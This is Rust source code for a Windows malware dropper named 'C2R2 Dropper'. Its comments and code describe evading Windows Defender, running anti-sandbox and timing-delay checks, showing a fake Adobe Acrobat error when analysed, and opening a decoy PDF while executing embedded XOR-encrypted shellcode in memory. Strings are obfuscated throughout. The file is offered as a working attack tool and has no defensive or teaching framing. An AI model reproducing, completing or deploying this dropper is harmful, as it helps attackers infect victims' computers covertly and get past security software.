//! C2R2 Dropper - Embedded Shellcode Execution
//! 
//! This dropper is designed to evade Windows Defender by:
//! - Embedding XOR-encrypted shellcode in the binary
//! - Decrypting in memory at runtime
//! - Executing shellcode without touching disk
//! - Anti-sandbox/Anti-VM checks
//! - Displaying a decoy PDF

#![cfg_attr(feature = "production", windows_subsystem = "windows")]

mod evasion;
mod shellcode;
mod config;

use std::thread;
use std::time::Duration;

fn main() {
    // Step 1: Initial delay to evade sandbox time acceleration
    thread::sleep(Duration::from_secs(3));
    
    // Step 2: Run anti-sandbox checks (production only)
    #[cfg(feature = "production")]
    {
        if evasion::is_sandbox_detected() {
            // Exit silently - maybe show a fake error
            show_fake_error();
            return;
        }
    }
    
    // Step 3: Additional human-like delay
    let delay = evasion::get_random_delay(1000, 3000);
    thread::sleep(Duration::from_millis(delay));
    
    // Step 4: Open decoy document (PDF) to look legitimate
    #[cfg(target_os = "windows")]
    {
        let _ = open_decoy_pdf();
    }
    
    // Step 5: Small delay after opening PDF
    thread::sleep(Duration::from_millis(500));
    
    // Step 6: Execute the embedded shellcode
    #[cfg(target_os = "windows")]
    {
        if let Err(_) = shellcode::execute_shellcode() {
            // Fail silently
        }
    }
}

/// Show a fake error message to look like a corrupted PDF
#[cfg(target_os = "windows")]
fn show_fake_error() {
    use std::ptr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONERROR};
    use obfstr::obfstr;
    
    unsafe {
        let title: Vec<u16> = OsStr::new(obfstr!("Adobe Acrobat Reader"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        let message: Vec<u16> = OsStr::new(obfstr!("The file is damaged and could not be repaired."))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        MessageBoxW(ptr::null_mut(), message.as_ptr(), title.as_ptr(), MB_OK | MB_ICONERROR);
    }
}

#[cfg(not(target_os = "windows"))]
fn show_fake_error() {}

/// Open a decoy PDF embedded or from temp
#[cfg(target_os = "windows")]
fn open_decoy_pdf() -> Result<(), Box<dyn std::error::Error>> {
    use std::env;
    use std::fs::File;
    use std::io::Write;
    use std::path::PathBuf;
    use obfstr::obfstr;
    
    // Get temp directory
    let temp_dir = env::temp_dir();
    let pdf_path = temp_dir.join(obfstr!("Document.pdf"));
    
    // Write embedded PDF decoy (minimal valid PDF)
    let pdf_data = config::DECOY_PDF_DATA;
    if !pdf_data.is_empty() {
        let mut file = File::create(&pdf_path)?;
        file.write_all(pdf_data)?;
        
        // Open with default PDF viewer
        open_file(&pdf_path);
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn open_file(path: &std::path::PathBuf) {
    use std::ptr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::shellapi::ShellExecuteW;
    use winapi::um::winuser::SW_SHOWNORMAL;
    use obfstr::obfstr;
    
    unsafe {
        let operation: Vec<u16> = OsStr::new(obfstr!("open"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        let path_wide: Vec<u16> = OsStr::new(path.to_str().unwrap_or(""))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        ShellExecuteW(
            ptr::null_mut(),
            operation.as_ptr(),
            path_wide.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_SHOWNORMAL,
        );
    }
}
